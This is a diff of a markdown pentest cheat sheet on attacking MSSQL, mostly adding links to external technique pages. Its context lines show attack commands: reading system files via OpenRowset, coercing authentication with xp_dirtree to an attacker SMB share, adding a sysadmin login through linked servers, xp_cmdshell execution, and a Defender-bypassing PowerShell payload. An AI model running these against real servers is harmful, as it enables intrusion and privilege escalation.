@@ -5,8 +5,10 @@
 
 ## Overview
 
-[mssql.md](../web-pentesting/sql-injection-sqli/mssql.md)
+[mssql.md](mkdocs/hacking/docs/enumeration/web-pentesting/SQLi/mssql.md)
 
+## Enumeration
+[https://swisskyrepo.github.io/InternalAllTheThings/databases/mssql-enumeration/](https://swisskyrepo.github.io/InternalAllTheThings/databases/mssql-enumeration/)
 
 ```sql
 https://www.exploit-db.com/papers/12975
@@ -39,9 +41,11 @@ SQL> help
 select x from OpenRowset(BULK 'C:\Windows\win.ini',SINGLE_CLOB) R(x)
 ```
 
+## Audit checks
+[https://swisskyrepo.github.io/InternalAllTheThings/databases/mssql-audit-checks/](https://swisskyrepo.github.io/InternalAllTheThings/databases/mssql-audit-checks/)
 
 ## With credentials
-
+[https://swisskyrepo.github.io/InternalAllTheThings/databases/mssql-credentials/](https://swisskyrepo.github.io/InternalAllTheThings/databases/mssql-credentials/)
 
 ```sql
 mssqlclient.py $user@$IP -windows-auth   # use domain/user format // then it will ask for the pass
@@ -58,7 +62,6 @@ SELECT * FROM fn_my_permissions(NULL, 'SERVER');
 
 ## Permissions
 
-
 ```sql
 # Permissions > see if we have permissions to execute certains commands
 EXEC sp_helprotect 'xp_dirtree'
@@ -69,7 +72,7 @@ EXEC sp_helprotect 'OPENROWSET'
 
 
 ## RCE
-
+[https://swisskyrepo.github.io/InternalAllTheThings/databases/mssql-command-execution/](https://swisskyrepo.github.io/InternalAllTheThings/databases/mssql-command-execution/)
 
 ```bash
 # xp_cmdshell
@@ -150,11 +153,12 @@ sudo smbserver.py share myshare -smb2support
 SQL> xp_dirtree '\\$LOCAL_IP\myshare',1,1
 ```
 
-
 ## Linked Servers
 
-\* Enum linked servers until we get access to a sysadmin user.
+??? +tip
+	 Enum linked servers until we get access to a sysadmin user.
 
+[https://swisskyrepo.github.io/InternalAllTheThings/databases/mssql-linked-database/](https://swisskyrepo.github.io/InternalAllTheThings/databases/mssql-linked-database/)
 
 ```bash
 https://www.netspi.com/blog/technical-blog/network-pentesting/how-to-hack-database-links-in-sql-server/
@@ -195,7 +199,7 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 ```
 
 
-## Read files / executing scripts as other users  (Python and R)
+## Read files / exec scripts as other users
 
 
 ```bash
@@ -375,7 +379,7 @@ enable_xp_cmdshell
 xp_cmdshell whoami
 ```
 
-## Encoded PS payload to bypass AV and get RCE
+## PS payload bypass
 
 ```python
 # Python script to convert PS code that bypasses Defender to Base64
